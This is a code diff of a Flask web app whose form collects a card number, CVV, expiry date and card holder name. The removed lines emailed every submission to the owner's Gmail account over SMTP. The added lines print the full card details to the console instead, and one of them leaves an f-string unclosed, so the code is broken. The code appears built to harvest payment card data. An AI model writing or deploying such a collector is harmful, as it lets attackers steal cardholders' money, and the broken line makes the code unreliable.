@@ -2,8 +2,7 @@ from flask import Flask, request, render_template_string
 import smtplib
 import os
 
-email = os.environ.get("EMAIL")
-password = os.environ.get("EMAIL_PASSWORD")
+
 
 app = Flask(__name__)
 
@@ -76,19 +75,7 @@ HTML = """
 </html>
 """
 
-def send_email(card_number, cvv, expiry, card_holder):
-    msg = f"""Subject: Someone submitted the form
 
-Card Number: {card_number}
-CVV: {cvv}
-Expiry: {expiry}
-Card Holder: {card_holder}
-"""
-
-    with smtplib.SMTP("smtp.gmail.com", 587) as connection:
-        connection.starttls()
-        connection.login(email, password)
-        connection.sendmail(email, email, msg)
 
 
 @app.route("/", methods=["GET", "POST"])
@@ -98,9 +85,10 @@ def home():
         cvv = request.form.get("cvv")
         expiry = request.form.get("expiry")
         card_holder = request.form.get("card_holder")
-
-        send_email(card_number, cvv, expiry, card_holder)
-
+        print(f"card_number{card_number}")
+        print(f"cvv {cvv}")
+        print(f"expiry {expiry}
+        print(f"card holder {card_holder}")
         return f"""
         <html>
         <body style="font-family:Arial;text-align:center;margin-top:100px;">
